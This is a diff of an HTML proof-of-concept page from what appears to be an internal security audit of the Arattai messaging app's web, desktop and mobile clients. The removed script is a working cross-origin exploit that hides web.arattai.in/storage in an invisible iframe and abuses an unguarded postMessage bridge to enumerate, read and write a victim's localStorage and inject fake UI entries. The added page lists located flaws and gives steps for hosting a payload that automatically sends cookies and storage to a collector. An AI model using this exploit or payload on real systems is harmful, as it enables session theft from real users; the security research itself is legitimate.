@@ -1,312 +1,207 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Arattai /storage Cross-Origin postMessage PoC</title>
-<style>
-  body { font-family: -apple-system, Segoe UI, Arial, sans-serif; max-width: 900px; margin: 24px auto; padding: 0 16px; color: #1b1b1b; }
-  h1 { font-size: 20px; }
-  .banner { background: #fff3cd; border: 1px solid #e0a800; padding: 10px 14px; border-radius: 6px; font-size: 13px; margin-bottom: 20px; }
-  .row { display: flex; gap: 8px; margin: 10px 0; flex-wrap: wrap; }
-  input[type=text] { flex: 1; min-width: 260px; padding: 6px 8px; font-family: monospace; }
-  button { padding: 7px 14px; cursor: pointer; }
-  #log { background: #0d1117; color: #c9d1d9; font-family: monospace; font-size: 12px; padding: 12px; border-radius: 6px; white-space: pre-wrap; height: 380px; overflow: auto; }
-  table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
-  th, td { border: 1px solid #ccc; padding: 6px 8px; text-align: left; vertical-align: top; }
-  th { background: #f0f0f0; }
-  .vuln { color: #b30000; font-weight: bold; }
-  .safe { color: #067d06; font-weight: bold; }
-  .pending { color: #888; }
-  iframe.hidden-target { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
-  code { background: #eee; padding: 1px 5px; border-radius: 3px; }
-</style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Arattai Mini-App WebView PoC — Cross-Client</title>
+  <link rel="stylesheet" href="css/poc.css">
 </head>
 <body>
+<div class="page">
 
-<h1>Arattai <code>/storage</code> Cross-Origin <code>postMessage</code> PoC (Finding F1)</h1>
+  <div class="header">
+    <h1>Arattai Mini-App WebView — Cross-Client PoC</h1>
+    <div class="subtitle">Authorized internal security research · 2026-09-02</div>
+    <div class="badge-row">
+      <span class="badge badge-critical">Critical</span>
+      <span class="badge badge-android">Android</span>
+      <span class="badge badge-ios">iOS</span>
+      <span class="badge badge-web">Web</span>
+      <span class="badge badge-desktop">Desktop</span>
+      <span class="badge badge-server">Server root cause</span>
+    </div>
+  </div>
 
-<div class="banner">
-  <strong>Authorized internal security research only.</strong> This page demonstrates that any external
-  origin can frame <code>&lt;target&gt;/storage</code> and drive the unauthenticated <code>db-handler.js</code>
-  <code>postMessage</code> RPC to read/enumerate/write the victim's <code>localStorage</code> on the target
-  origin, from an attacker page, using the victim's existing session cookies. Do not use outside an
-  authorized test environment. See the companion report
-  <code>../storage-bridge-cross-origin-report.md</code> for full source evidence.
+  <div class="info-box">
+    <strong>Scope</strong> — This page is an internal proof-of-concept for a security audit of Arattai's
+    Mini-App feature. It must only be used against test environments with explicit authorization.
+    The payload page (<code>miniapp.html</code>) actively collects and exfiltrates data to a collector
+    you configure in <code>js/collector-config.js</code>.
+  </div>
+
+  <h2>Attack Model</h2>
+  <p>
+    A malicious or compromised <strong>business registered on the Arattai platform</strong> configures its
+    Mini-App target URL to this PoC page. The server (<code>GetLinkAction.java</code>) returns the URL
+    without any host allow-list check. Every Arattai client then loads the URL into a JS-enabled
+    web-content container with insufficient origin isolation.
+  </p>
+
+  <h2>Trigger Steps</h2>
+  <ol class="steps">
+    <li><strong>Configure collector</strong> — edit <code>js/collector-config.js</code> and set <code>COLLECTOR_URL</code> to your listener (see <code>collector/README.md</code>).</li>
+    <li><strong>Host this folder</strong> — push to GitHub Pages or run <code>python -m http.server 8080</code>. Note your public URL.</li>
+    <li><strong>Register a Mini-App</strong> — in your Arattai test org, create a business Mini-App whose target URL is <code>https://&lt;your-host&gt;/miniapp.html</code>.</li>
+    <li><strong>Open the Mini-App</strong> — from any Arattai client. The payload executes automatically.</li>
+    <li><strong>Observe the collector</strong> — the payload POSTs a JSON beacon with fingerprint, cookies, storage contents, and probe results.</li>
+  </ol>
+
+  <hr>
+
+  <h2>Cross-Client Vulnerability Matrix</h2>
+
+  <table>
+    <thead>
+      <tr>
+        <th>ID</th>
+        <th>Client</th>
+        <th>Severity</th>
+        <th>Title</th>
+        <th>Key Evidence</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>S0</td>
+        <td><span class="badge badge-server">Server</span></td>
+        <td><span class="badge badge-high">High</span></td>
+        <td>Format-only URL validation — any host/http accepted</td>
+        <td><code>BusinessMiniAppManager.java:108</code> · <code>GetLinkAction.java:55</code></td>
+      </tr>
+      <tr>
+        <td>A1</td>
+        <td><span class="badge badge-android">Android</span></td>
+        <td><span class="badge badge-high">High</span></td>
+        <td>Unvalidated server URL + <code>allowFileAccess=true</code> + <code>MIXED_CONTENT_ALWAYS_ALLOW</code></td>
+        <td><code>MiniAppDialogFragment.kt:2236,2250,2279</code></td>
+      </tr>
+      <tr>
+        <td>A2</td>
+        <td><span class="badge badge-android">Android</span></td>
+        <td><span class="badge badge-medium">Medium</span></td>
+        <td><code>intent: browser_fallback_url</code> re-loaded without validation</td>
+        <td><code>MiniAppDialogFragment.kt:2021–2031</code></td>
+      </tr>
+      <tr>
+        <td>I1</td>
+        <td><span class="badge badge-ios">iOS</span></td>
+        <td><span class="badge badge-medium">Medium</span></td>
+        <td>No <code>decidePolicyFor</code> — no scheme/host allow-list on WKWebView</td>
+        <td><code>BusinessMiniAppWebViewController.swift:275–291</code></td>
+      </tr>
+      <tr>
+        <td>W1</td>
+        <td><span class="badge badge-web">Web</span></td>
+        <td><span class="badge badge-critical">Critical</span></td>
+        <td>iframe <code>sandbox="allow-same-origin allow-scripts"</code> + no <code>frame-src</code> CSP</td>
+        <td><code>MiniAppViewer.vue:75</code> · <code>common.jspf:78</code></td>
+      </tr>
+      <tr>
+        <td>W2</td>
+        <td><span class="badge badge-web">Web</span></td>
+        <td><span class="badge badge-critical">Critical</span></td>
+        <td>Unauthenticated <code>postMessage</code> bridge — localStorage/sessionStorage/IDB cross-origin read</td>
+        <td><code>db-handler.js:15</code> · <code>idbmanager.js:96</code></td>
+      </tr>
+      <tr>
+        <td>W3</td>
+        <td><span class="badge badge-web">Web</span></td>
+        <td><span class="badge badge-medium">Medium</span></td>
+        <td>oEmbed unfurl iframes use same dangerous sandbox</td>
+        <td><code>unfurl-ui.js:535–573</code></td>
+      </tr>
+      <tr>
+        <td>D1</td>
+        <td><span class="badge badge-desktop">Desktop</span></td>
+        <td><span class="badge badge-high">High</span></td>
+        <td><code>setPermissionRequestHandler → callback(true)</code> — all permissions auto-granted</td>
+        <td><code>app_view.js:297</code></td>
+      </tr>
+      <tr>
+        <td>D2</td>
+        <td><span class="badge badge-desktop">Desktop</span></td>
+        <td><span class="badge badge-high">High</span></td>
+        <td><code>do-logout</code> IPC loads renderer-supplied URL, bypasses allow-list</td>
+        <td><code>main.js:1110</code></td>
+      </tr>
+      <tr>
+        <td>D3</td>
+        <td><span class="badge badge-desktop">Desktop</span></td>
+        <td><span class="badge badge-high">High</span></td>
+        <td>URL validator substring/prefix bypass — <code>isChatURL</code>/<code>isValidArattaiURL</code></td>
+        <td><code>urlValidator.js:33,44</code></td>
+      </tr>
+      <tr>
+        <td>D4</td>
+        <td><span class="badge badge-desktop">Desktop</span></td>
+        <td><span class="badge badge-medium">Medium</span></td>
+        <td>Nav guards on non-cancelable <code>did-navigate</code> events</td>
+        <td><code>arattai_view.js:116,155</code></td>
+      </tr>
+      <tr>
+        <td>D5</td>
+        <td><span class="badge badge-desktop">Desktop</span></td>
+        <td><span class="badge badge-low">Low</span></td>
+        <td>Favicon URL HTML-injection into tab-strip via <code>jQuery.html()</code></td>
+        <td><code>main_page.js:137</code></td>
+      </tr>
+      <tr>
+        <td>D6</td>
+        <td><span class="badge badge-desktop">Desktop</span></td>
+        <td><span class="badge badge-low">Low</span></td>
+        <td>SSRF via <code>get-unfurl-data</code> — scheme-only check, no host/IP filter</td>
+        <td><code>main.js:1484</code></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <h2>Per-Client Expected PoC Outcomes</h2>
+
+  <h3>Android (<code>MiniAppDialogFragment</code> WebView)</h3>
+  <p>
+    The WebView loads <code>miniapp.html</code> with <code>allowFileAccess=true</code>,
+    <code>MIXED_CONTENT_ALWAYS_ALLOW</code>, and geolocation enabled.
+    Expected probe outcomes: JS exec ✓, fingerprint ✓, mixed-content load ✓ (HTTP image loads),
+    geolocation auto-granted (on API 30+ without permission dialog), file:// fetch attempted.
+    Beacon POSTed with full UA + environment.
+  </p>
+
+  <h3>iOS (WKWebView — <code>BusinessMiniAppWebViewController</code>)</h3>
+  <p>
+    JS runs in the WKWebView. No script-message-handler bridge exists, so impact is limited to
+    JS-in-origin phishing. Expected: JS exec ✓, fingerprint ✓. No auto-granted permissions (iOS
+    always prompts). Geolocation / media probes show "prompt shown" (SAFE row).
+  </p>
+
+  <h3>Web Client (<code>MiniAppViewer.vue</code> iframe)</h3>
+  <p>
+    The iframe loads with <code>sandbox="allow-same-origin allow-scripts allow-popups allow-forms"</code>.
+    JS runs. The <strong>postMessage bridge probe</strong> (W2) attempts to read <code>localStorage</code>
+    keys from the Arattai web shell via <code>db-handler.js</code>. If the storage iframe is present in
+    the parent window, captured values are included in the beacon.
+  </p>
+
+  <h3>Desktop (Electron — <code>source/app</code>)</h3>
+  <p>
+    The PoC page is loaded (via the Mini-App feature or via the URL-validator bypass chain) into the
+    chat <code>WebContentsView</code>. <code>setPermissionRequestHandler</code> auto-grants all
+    permissions. Expected: JS exec ✓, geolocation auto-granted ✓, microphone auto-granted ✓,
+    <code>DesktopModule</code> bridge listed if reachable. Beacon POSTed.
+  </p>
+
+  <hr>
+
+  <a class="badge badge-critical" href="miniapp.html" style="font-size:1rem;padding:10px 22px;border-radius:8px;display:inline-block;margin-bottom:8px;">
+    ▶ Open Payload Page (miniapp.html)
+  </a>
+  <p style="font-size:0.8rem;color:var(--na);">Set <code>COLLECTOR_URL</code> in <code>js/collector-config.js</code> first.</p>
+
+  <div class="footer">
+    Arattai Security Audit — Internal · Authorized use only · josan.g@zohocorp.com
+  </div>
+
 </div>
-
-<div class="row">
-  <label style="width:100%">Target origin (must have an active, logged-in session for a real result):</label>
-  <input id="targetOrigin" type="text" value="https://web.arattai.in">
-</div>
-<div class="row">
-  <button id="btnLoad">1. Load /storage in hidden iframe</button>
-  <button id="btnEnumerate" disabled>2. Enumerate + read localStorage keys</button>
-  <button id="btnWriteProbe" disabled>3. Write-probe (harmless canary key)</button>
-  <button id="btnClear">Clear log</button>
-</div>
-
-<div class="row" style="border-top:1px solid #ddd; padding-top:10px;">
-  <label style="width:100%"><strong>Cross-visibility test</strong> — use this to check whether the PoC's
-    storage bucket is the SAME one the real logged-in tab uses, or an isolated (partitioned) one.
-    Set a key/value in the real <code>web.arattai.in</code> tab's own console, then try to read it here
-    with the same key name — or vice versa.</label>
-  <input id="customKey" type="text" placeholder="key name" style="flex:1;min-width:160px;">
-  <input id="customVal" type="text" placeholder="value (for write)" style="flex:1;min-width:160px;">
-  <button id="btnCustomRead" disabled>Read this key</button>
-  <button id="btnCustomWrite" disabled>Write this key</button>
-</div>
-
-<div class="row" style="border-top:1px solid #ddd; padding-top:10px;">
-  <label style="width:100%"><strong>Visible UI-injection PoC ("Recent Search" entry)</strong> — writes a
-    single fake entry into the <code>recent_searches</code> localStorage key. This key is deliberately
-    chosen because (a) it is read and rendered directly by the app's Global Search "Recent" list
-    (<code>GlobalSearch.vue</code>) and (b) it is <em>not</em> encryption/session material, so this is
-    safe to demo without corrupting your real session or E2EE keys. After clicking Inject, open/refresh
-    Global Search in the real, already-logged-in <code>web.arattai.in</code> tab and look for the
-    injected entry — if it appears, this is your screenshot, AND it proves the PoC's storage bucket is
-    the SAME one the real tab uses (no partitioning). If it never appears, the buckets are isolated —
-    re-run the cross-visibility test above to confirm.</label>
-  <input id="injectTitle" type="text" style="flex:1;min-width:260px;" value="⚠ INJECTED FROM REMOTE ORIGIN (attacker.example)">
-  <button id="btnInjectRecent" disabled>Inject fake Recent Search entry</button>
-  <button id="btnCleanupRecent" disabled>Remove injected entry (cleanup)</button>
-</div>
-
-<table>
-  <thead><tr><th style="width:26%">Probe</th><th style="width:12%">Status</th><th>Detail</th></tr></thead>
-  <tbody id="resultsBody">
-    <tr><td>Frame load / <code>arattai_iframe_loaded</code> handshake</td><td id="s-load" class="pending">PENDING</td><td id="d-load">—</td></tr>
-    <tr><td>Origin validation on receiver</td><td id="s-origin" class="pending">PENDING</td><td id="d-origin">Expect REJECT after remediation; today expect no check.</td></tr>
-    <tr><td>Key enumeration (<code>localStorage.key(i)</code>)</td><td id="s-enum" class="pending">PENDING</td><td id="d-enum">—</td></tr>
-    <tr><td>Value read (<code>localStorage.getItem</code>)</td><td id="s-read" class="pending">PENDING</td><td id="d-read">—</td></tr>
-    <tr><td>Write (<code>localStorage.setItem</code>)</td><td id="s-write" class="pending">PENDING</td><td id="d-write">—</td></tr>
-  </tbody>
-</table>
-
-<h3>Live log</h3>
-<div id="log"></div>
-
-<script>
-(function () {
-  var frame = null;
-  var pending = {};
-  var reqCounter = 0;
-  var loaded = false;
-  var CANARY_KEY = "__arattai_poc_canary__";
-  var CANARY_VAL = "poc-write-" + Date.now();
-
-  function logLine(msg, obj) {
-    var el = document.getElementById('log');
-    var ts = new Date().toISOString().split('T')[1].replace('Z', '');
-    var text = '[' + ts + '] ' + msg + (obj !== undefined ? ' ' + JSON.stringify(obj) : '');
-    el.textContent += text + '\n';
-    el.scrollTop = el.scrollHeight;
-    console.log('[PoC]', msg, obj);
-  }
-
-  function setStatus(rowId, status, detail) {
-    var s = document.getElementById('s-' + rowId);
-    var d = document.getElementById('d-' + rowId);
-    s.textContent = status;
-    s.className = status === 'VULN' ? 'vuln' : (status === 'SAFE' ? 'safe' : 'pending');
-    if (detail !== undefined) d.textContent = detail;
-  }
-
-  function targetOrigin() {
-    return document.getElementById('targetOrigin').value.replace(/\/$/, '');
-  }
-
-  function nextId() {
-    return 'poc-' + (++reqCounter) + '-' + Math.random().toString(36).slice(2);
-  }
-
-  function send(msgObj) {
-    if (!frame || !frame.contentWindow) { logLine('ERROR: frame not ready'); return; }
-    // Deliberately send with targetOrigin '*' — this is the attacker's own choice, irrelevant
-    // to whether the RECEIVER validates event.origin. That is exactly what we are testing.
-    frame.contentWindow.postMessage(msgObj, '*');
-    logLine('SENT ->', msgObj);
-  }
-
-  window.addEventListener('message', function (event) {
-    var data = event.data;
-    if (!data || typeof data !== 'object') return;
-
-    if (data.type === 'arattai_iframe_loaded') {
-      loaded = true;
-      logLine('RECV <- arattai_iframe_loaded (handshake)', { origin: event.origin });
-      setStatus('load', 'VULN', 'Frame at ' + targetOrigin() + '/storage loaded inside this ' +
-        'cross-origin page and announced readiness to us (attacker origin ' + location.origin + '). ' +
-        'A same-origin-only shell would never receive this from an external page.');
-      setStatus('origin', 'VULN', 'Handshake was accepted with target-origin arg "*" and no origin ' +
-        'gate on the receiver side (db-handler.js:15) — see log for raw event.');
-      document.getElementById('btnEnumerate').disabled = false;
-      document.getElementById('btnWriteProbe').disabled = false;
-      document.getElementById('btnCustomRead').disabled = false;
-      document.getElementById('btnCustomWrite').disabled = false;
-      document.getElementById('btnInjectRecent').disabled = false;
-      document.getElementById('btnCleanupRecent').disabled = false;
-      return;
-    }
-
-    if (data.type === 'LocalStorageResponse' && data.requestId && pending[data.requestId]) {
-      var req = pending[data.requestId];
-      delete pending[data.requestId];
-      logLine('RECV <- LocalStorageResponse for ' + req.label, { origin: event.origin, result: data.result, error: data.error });
-      req.resolve(data);
-    }
-  });
-
-  document.getElementById('btnLoad').onclick = function () {
-    var origin = targetOrigin();
-    if (frame) { frame.remove(); }
-    loaded = false;
-    frame = document.createElement('iframe');
-    frame.className = 'hidden-target';
-    frame.src = origin + '/storage';
-    document.body.appendChild(frame);
-    logLine('Framing ' + origin + '/storage from attacker origin ' + location.origin);
-    setStatus('load', 'PENDING', 'waiting for iframe onload + handshake…');
-    setTimeout(function () {
-      if (!loaded) {
-        setStatus('load', 'SAFE', 'No handshake received within 8s — frame likely blocked ' +
-          '(X-Frame-Options/frame-ancestors), session not authenticated, or receiver now origin-checked.');
-      }
-    }, 8000);
-  };
-
-  function requestLocalStorage(methodName, args, label) {
-    return new Promise(function (resolve) {
-      var id = nextId();
-      pending[id] = { resolve: resolve, label: label };
-      send({ type: 'LocalStorageRequest', requestId: id, params: { methodName: methodName, arguments: args } });
-      setTimeout(function () {
-        if (pending[id]) { delete pending[id]; resolve({ timeout: true }); }
-      }, 5000);
-    });
-  }
-
-  document.getElementById('btnEnumerate').onclick = async function () {
-    logLine('--- Enumerating localStorage keys on ' + targetOrigin() + ' via localStorage.key(i) ---');
-    var keys = [];
-    for (var i = 0; i < 40; i++) {
-      var resp = await requestLocalStorage('key', i, 'key(' + i + ')');
-      if (resp.timeout) { logLine('key(' + i + ') timed out — stopping enumeration'); break; }
-      if (resp.error || resp.result === null || resp.result === undefined) break;
-      keys.push(resp.result);
-    }
-    if (keys.length) {
-      setStatus('enum', 'VULN', keys.length + ' key(s) enumerated cross-origin: ' + keys.join(', '));
-      logLine('Enumerated keys:', keys);
-
-      logLine('--- Reading value of first key via localStorage.getItem ---');
-      var readResp = await requestLocalStorage('getItem', keys[0], 'getItem(' + keys[0] + ')');
-      if (!readResp.timeout && !readResp.error) {
-        setStatus('read', 'VULN', 'Value of "' + keys[0] + '" read cross-origin (truncated): ' +
-          String(readResp.result).slice(0, 200));
-      } else {
-        setStatus('read', 'SAFE', 'No value returned (blocked or empty).');
-      }
-    } else {
-      setStatus('enum', 'SAFE', 'No keys returned — receiver rejected the request or storage is empty.');
-      setStatus('read', 'SAFE', 'Skipped — enumeration returned no keys.');
-    }
-  };
-
-  document.getElementById('btnWriteProbe').onclick = async function () {
-    logLine('--- Write-probe: localStorage.setItem("' + CANARY_KEY + '", "' + CANARY_VAL + '") ---');
-    var writeResp = await requestLocalStorage('setItem', [CANARY_KEY, CANARY_VAL], 'setItem(canary)');
-    if (writeResp.timeout) {
-      setStatus('write', 'SAFE', 'setItem timed out — no confirmation.');
-      return;
-    }
-    logLine('--- Verifying write via getItem ---');
-    var readBack = await requestLocalStorage('getItem', CANARY_KEY, 'getItem(canary)');
-    if (!readBack.timeout && readBack.result === CANARY_VAL) {
-      setStatus('write', 'VULN', 'Cross-origin write CONFIRMED — canary key/value round-tripped on ' +
-        targetOrigin() + '. Cleaning up…');
-      await requestLocalStorage('removeItem', CANARY_KEY, 'removeItem(canary)');
-      logLine('Canary key removed.');
-    } else {
-      setStatus('write', 'SAFE', 'Write not confirmed (blocked or origin-checked).');
-    }
-  };
-
-  document.getElementById('btnClear').onclick = function () {
-    document.getElementById('log').textContent = '';
-  };
-
-  document.getElementById('btnCustomRead').onclick = async function () {
-    var key = document.getElementById('customKey').value;
-    if (!key) { logLine('Enter a key name first.'); return; }
-    logLine('--- Cross-visibility READ: getItem("' + key + '") ---');
-    var resp = await requestLocalStorage('getItem', key, 'custom getItem(' + key + ')');
-    if (resp.timeout) {
-      logLine('CROSS-VISIBILITY RESULT: timeout — no response.');
-    } else if (resp.result === null || resp.result === undefined) {
-      logLine('CROSS-VISIBILITY RESULT: key "' + key + '" not found in the PoC\'s storage bucket. ' +
-        'If you know this key exists in the REAL tab (checked via its own console), this bucket is ' +
-        'ISOLATED/partitioned from the real tab\'s storage — the RPC is real but not reaching the ' +
-        'same storage the session actually uses in this browser.');
-    } else {
-      logLine('CROSS-VISIBILITY RESULT: VALUE FOUND -> ' + JSON.stringify(resp.result) +
-        '  — this bucket IS the same storage the real tab sees. Full session-data exposure confirmed.');
-    }
-  };
-
-  var RECENT_SEARCH_KEY = 'recent_searches';
-  var INJECT_ID_PREFIX = '__poc_injected_';
-  var injectId = INJECT_ID_PREFIX + Date.now() + '__';
-
-  document.getElementById('btnInjectRecent').onclick = async function () {
-    var title = document.getElementById('injectTitle').value || 'Injected via postMessage PoC';
-    logLine('--- UI-injection: reading current recent_searches to prepend (non-destructive) ---');
-    var readResp = await requestLocalStorage('getItem', RECENT_SEARCH_KEY, 'getItem(recent_searches)');
-    var list = [];
-    if (!readResp.timeout && !readResp.error && readResp.result) {
-      try { list = JSON.parse(readResp.result); if (!Array.isArray(list)) list = []; } catch (e) { list = []; }
-    }
-    var fakeEntry = { id: injectId, title: title, type: 'user' };
-    list.unshift(fakeEntry);
-    logLine('New recent_searches array (fake entry prepended):', list);
-    var writeResp = await requestLocalStorage('setItem', [RECENT_SEARCH_KEY, JSON.stringify(list)], 'setItem(recent_searches)');
-    if (writeResp.timeout) {
-      logLine('Injection write timed out — no confirmation.');
-    } else {
-      logLine('Injection write sent. Now go to the REAL web.arattai.in tab, open Global Search, and ' +
-        'check the "Recent" section for: "' + title + '". If it appears, take your screenshot now — ' +
-        'this proves an unrelated remote origin wrote data that the trusted app rendered in its own UI.');
-    }
-  };
-
-  document.getElementById('btnCleanupRecent').onclick = async function () {
-    logLine('--- Cleanup: removing any PoC-injected entries from recent_searches ---');
-    var readResp = await requestLocalStorage('getItem', RECENT_SEARCH_KEY, 'getItem(recent_searches) [cleanup]');
-    if (readResp.timeout || readResp.error || !readResp.result) {
-      logLine('Nothing to clean up (no existing value or timeout).');
-      return;
-    }
-    var list = [];
-    try { list = JSON.parse(readResp.result); if (!Array.isArray(list)) list = []; } catch (e) { list = []; }
-    var filtered = list.filter(function (item) {
-      return !(item && typeof item.id === 'string' && item.id.indexOf(INJECT_ID_PREFIX) === 0);
-    });
-    if (filtered.length === list.length) {
-      logLine('No PoC-injected entries found — nothing removed.');
-      return;
-    }
-    await requestLocalStorage('setItem', [RECENT_SEARCH_KEY, JSON.stringify(filtered)], 'setItem(recent_searches) [cleanup]');
-    logLine('Removed ' + (list.length - filtered.length) + ' injected entr(y/ies). Refresh Global Search in the real tab to confirm it is gone.');
-  };
-
-  document.getElementById('btnCustomWrite').onclick = async function () {
-    var key = document.getElementById('customKey').value;
-    var val = document.getElementById('customVal').value;
-    if (!key) { logLine('Enter a key name first.'); return; }
-    logLine('--- Cross-visibility WRITE: setItem("' + key + '", "' + val + '") ---');
-    await requestLocalStorage('setItem', [key, val], 'custom setItem(' + key + ')');
-    logLine('Write sent. Now check the REAL web.arattai.in tab console: localStorage.getItem("' + key + '")');
-  };
-})();
-</script>
 </body>
 </html>
